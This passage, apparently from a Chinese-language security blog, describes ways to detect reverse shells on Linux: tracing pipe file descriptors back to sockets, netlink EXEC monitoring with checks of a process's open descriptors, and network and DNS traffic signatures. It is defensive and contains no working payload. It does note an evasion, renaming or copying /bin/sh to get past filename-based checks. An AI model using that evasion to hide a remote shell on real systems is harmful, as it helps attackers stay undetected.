### 1.2 检测 file descriptor 是否指向一个管道符（pipe）

对于利用“管道符”传递指令的反弹shell攻击方式来说，这类反弹shell的本质可以归纳为**file descriptor的重定向到一个pipe句柄**。

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191215105358151-246000034.png)

更进一步地说，不管做了多少层的pipe，反弹shell的本质是将server的输入传递给client的bash，因此肯定存在socket连接。

我们只需要根据pid追溯pipe上游的进程，并判断其进程fd，检查是否是来自一个socket。

例如，跟踪pipe，发现pipe的进程建立了socket连接，那么就存在反弹shell的风险。 

## 2.netlink监控+fd异常检测

- 监听Netlink Socket，实时获取进程EXEC事件。
- 如果为Shell进程，检查进程启动打开的FD，
  - 打开了Socket
  - 未使用/dev/tty、/dev/pts/n、/dev/ptmx等终端
  - 则确认为反弹Shell 

**绕过风险：仅能通过进程执行文件名判断是否为Shell进程，上传可执行文件、拷贝Bash文件到其他路径等方法会绕过这个方法**。

例如通过将/bin/sh重命名为其他名字进行反弹shell。

## 3.脚本文件 && 应用程序 && 无文件（fileless）反弹shell检测

需要注意的是，操作系统是分层的，Bash只是一个应用程序的普通应用，其内部封装了调用glibc execve的功能而已，除了bash之外，白帽子还可以基于任意的应用层技术来实现反弹shell，例如：

- python/perl实现纯代码形式的反弹shell文件执行：文件脚本检测
- python/perl实现纯代码形式的反弹shell命令行指令（fileless）：纯命令行fileless检测
- C/C++实现纯代码形式的反弹shell：二进制文件检测

## 4. 特征检测

#### 4.1网络层反弹shell通信特征检测

反弹shell的通信会话中，会包含一些”cmdline shell特征“，例如”#root....“等，可以在网络侧进行NTA实时检测。



#### 4.2DNS反弹shell特征检测

针对DNS流量进行分析，判断关联进程是否开启/dev/net/tun，或者/dev/net/tap隧道等等。

